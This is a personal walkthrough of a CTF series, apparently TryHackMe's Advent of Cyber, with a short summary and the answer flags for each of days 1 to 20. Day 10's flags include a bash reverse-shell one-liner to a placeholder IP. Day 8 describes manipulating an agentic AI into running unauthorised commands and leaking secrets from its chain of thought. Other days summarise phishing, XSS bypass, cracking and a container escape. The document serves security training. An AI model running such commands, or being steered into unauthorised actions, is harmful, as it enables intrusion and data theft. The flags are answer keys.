# Day 1
- The AoC starts off with introduction to the Linux CLI
- It included investigating a server breach by exploring files, checking logs for failed logins, and uncovering malicious scripts
- We used `cd` `ls` `grep` `sudo` `cat` `find` also piping and shell scripts

## Flags:
```
THM{learning-linux-cli}
THM{sir-carrotbane-attacks}
THM{until-we-meet-again}
```

# Day 2:
- The second day was an introduction to phishing
- We set up a fake login page using a Python script to harvest credentials and used the Social Engineer Toolkit (SET) to send a spoofed phishing email. This tricked the target user into visiting our malicious site, where we captured their username and password.


## Flags: 
```
unranked-wisdom-anthem
1984000
```

# Day 3:
- Analyzed system web traffic logs to visualize network activity 
- Identified massive spikes in requests and unusual patterns to pinpoint potential malicious actors
- Detected dangerous SQL injection attempts originating from specific IP addresses
- Uncovered indicators of Command and Control (C2) communications and Remote Code Execution (RCE) within the logs

## Flags:

```
198.51.100.55
2025-10-12
993
658
126167
```


# Day 4:

- Explored how AI assistants like "Van SolveIT" can augment both Red and Blue team operations by handling tedious tasks.
- Used the AI to generate a custom exploit script for a vulnerability, then executed it to compromise a target (Red team)
- Analyzed web logs identifying attack patterns and suspicious user agents without manual sifting (blue team)

## Flag:
  
```
THM{AI_MANIA}
THM{SQLI_EXPLOIT}
```

***

# Day 5:

- This day is about Insecure Direct Object References. It is a vulnerability where an attacker can access unauthorized data by changing url or api request.
- Investigated a web app to track down a sus user manipulating whishlists.
- Used browser dev tools to find API call containing userid and modified it to cycle through user accounts.

## Flag:
```
Insecure Direct Object Reference
Horizontal
15
```


***


# Day 6:

- This day was about malware analysus using sanbox isolated environments.
- Executed sus file which was sent from a phishing email
- Learnt static and dynamic analysis
- Used PEstudio, Regshot and ProcMon
- The malware establised persistence by adding itself to the windows registry and communicates with c2 server over http


## Flag:
```
F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33
THM{STRINGS_FOUND}
HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\HopHelper
http
```


# Day 7:
- This day focused on network forensics and server-side analysis using nmap and nc to identify open ports and running services.
- Performed manual TCP and UDP port scanning with nc, while also using dig to enumerate DNS information and pinpoint specific keys.
- Connected to an exposed FTP service to retrieve hidden data and used netcat listeners to analyze server responses.
- Interacted with a backend MySQL database to extract the final flag.

# Flags:
```
Pwned by HopSec
3aster_
15_th3_
n3w_xm45
3306
THM{4ll_s3rvice5_d1sc0vered}
```


# Day 8:

* This day was on the art of prompt engineering, using the agentic AI on the calendar website.
* We used the AI to proceed with commands which we aren't actually authorised to perform.
* Viewed the AI's Chain-of-Thought reasoning to find sensitive info and gave it a prompt to perform something it inherently shouldn't.
* Thereby executing restricted commands and leaking sensitive information.

## Flag:

```
THM{XMAS_IS_COMING__BACK}

```


# Day 9:

* This day focused on password security, where we used brute-force attacks and dictionaries on encrypted files.
* We used `pdfcrack` with a dictionary to guess the password for a protected PDF file.
* Used `john` to brute-force a password-protected .zip file.
* Explored masked attacks and `hashcat` for GPU-accelerated cracking.
* The challenge culminated in a response playbook to help detect if a system is running password-cracking software to prevent data leaks.

## Flags:

```
THM{Cr4ck1ng_PDFs_1s_34$y}
THM{Cr4ck1n6_z1p$_1s_34$yyyy}

```

---

# Day 10:

* We used Azure Sentinel to view logs by running specific queries.
* Taking on a security analyst perspective, we categorized the severity of various issues.
* We modified search filters to hunt down specific server logs to reveal the flag.

## Flags:

```
10
High
4
malicious_mod.ko
/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
172.16.0.12
203.0.113.45
deploy

```

---

# Day 11:

* This room required us to delve into Cross-Site Scripting (XSS) to exploit a provided webpage.
* We mutated payloads to bypass filters and make the server execute our commands.
* We learned the key differences between reflected and stored XSS, and how to protect systems against these attacks.

## Flags:

```
stored
THM{Evil_Bunny}
THM{Evil_Stored_Egg}

```

---

# Day 12:

* This room focused on phishing as a social engineering tactic to breach corporate systems.
* We had to classify emails as either spam or phishing and identify the specific social engineering technique used.
* We analyzed techniques like typosquatting, spoofing, punycode, and impersonation.

## Flags:

```
THM{yougotnumber1-keep-it-going}
THM{nmumber2-was-not-tha-thard!}
THM{Impersonation-is-areal-thing-keepIt}
THM{Get-back-SOC-mas!!}
THM{It-was-just-a-sp4m!!}
THM{number6-is-the-last-one!-DX!}

```

---

# Day 13:

* We explored YARA rules to define and detect malware patterns and behaviors.
* The tasks covered various use cases, including Post-incident analysis, Threat Hunting, and Memory analysis.
* We focused on writing rules to search for specific strings and hex values, using conditions to identify malicious code.

## Flags:

```
5
/TBFC:[A-Za-z0-9]+/
Find me in HopSec Island

```

---

# Day 14:

* This challenge dealt with Docker containers and how they function.
* We worked with a live container environment and fiddled with various Docker commands.
* Investigated the `Dockerfile` and running processes to escape the container.

## Flags:

```
docker ps
Dockerfile
THM{DOCKER_ESCAPE_SUCCESS}
DeployMaster2025!

```

---

# Day 15:

* We continued using Splunk to analyze suspicious web commands and exploits on a server.
* This was an analytical task where we had to sift through raw data using search values and filters.
* We correlated dates and events to identify specific executable traces.

## Flags:

```
whoami.exe
PowerShell.exe

```

---

# Day 16:

* This challenge focused on the Windows Registry and specific hives of interest.
* We used forensics tools like Registry Editor and Registry Explorer.
* Analyzed the hives of a compromised system to find traces of malware and persistence mechanisms.

## Flags:

```
DroneManager Updater
C:\Users\dispatch.admin\Downloads\DroneManager_Setup.exe
"C:\Program Files\DroneManager\dronehelper.exe" --background

```

# Day 17:

* This day focused on encoding and decoding techniques using CyberChef to bypass 5 locks and save McSkidy.
* We analyzed HTTP headers to find hidden "magic questions" and encoded them to communicate with a guard bot to retrieve passwords.
* We reverse-engineered JavaScript login logic, handling challenges like double Base64 encoding, XOR operations with specific keys, and MD5 hashing.
* Finally, we chained multiple operations (ROT13, Hex, Reverse) based on specific recipe IDs to crack the final credentials.

## Flags:

```
Iamsofluffy
Itoldyoutochangeit!
BugsBunny
passw0rd1
51rBr34chBl0ck3r
THM{M3D13V4L_D3C0D3R_4D3P7}

```


# Day 18:

* This day focused on obfuscation and deobfuscation techniques using CyberChef and PowerShell to analyze a malicious script (`SantaStealer.ps1`).
* We deobfuscated a Base64-encoded Command & Control (C2) URL to reveal the attacker's endpoint.
* We then simulated the attacker's behavior by obfuscating an API key using XOR and Hex encoding to bypass internal script checks.
* Finally, we modified and executed the script to validate our findings and retrieve the hidden flags.

## Flags:

```
THM{C2_De0bfuscation_29838}
THM{API_Obfusc4tion_ftw_0283}

```


# Day 19:

* This day focused on Industrial Control Systems (ICS) and Modbus protocol weaknesses, specifically the lack of authentication.
* We used `nmap` to discover the open Modbus port (502) and a Python script with `pymodbus` to interact directly with the Programmable Logic Controller (PLC).
* Read Holding Registers to identify the system configuration (shipping "Eggs" instead of "Gifts") and Coils to pinpoint safety mechanisms (the "trap" coil).
* We had to carefully disable the trap mechanism (C11) before changing the package type (HR0) to avoid triggering a system-wide "ocean dump" and self-destruct sequence.

## Flags:

```
502
THM{eGgMas0V3r}

```



# Day 20:

* Analyzed a "Time-of-Check to Time-of-Use" (TOCTOU) race condition vulnerability in a shopping cart application.
* We intercepted the "Buy" request using Burp Suite and sent it to Repeater to understand the purchase logic.
* Exploited the lag between the stock check and the actual deduction by sending multiple purchase requests simultaneously (using Burp Intruder or parallel Repeater tabs).
* This allowed us to purchase more "SleighToy" items than were actually in stock, pushing the inventory into negative values and revealing the hidden flags.

## Flags:

```
THM{WINNER_OF_R@CE007}
THM{WINNER_OF_Bunny_R@ce}
```



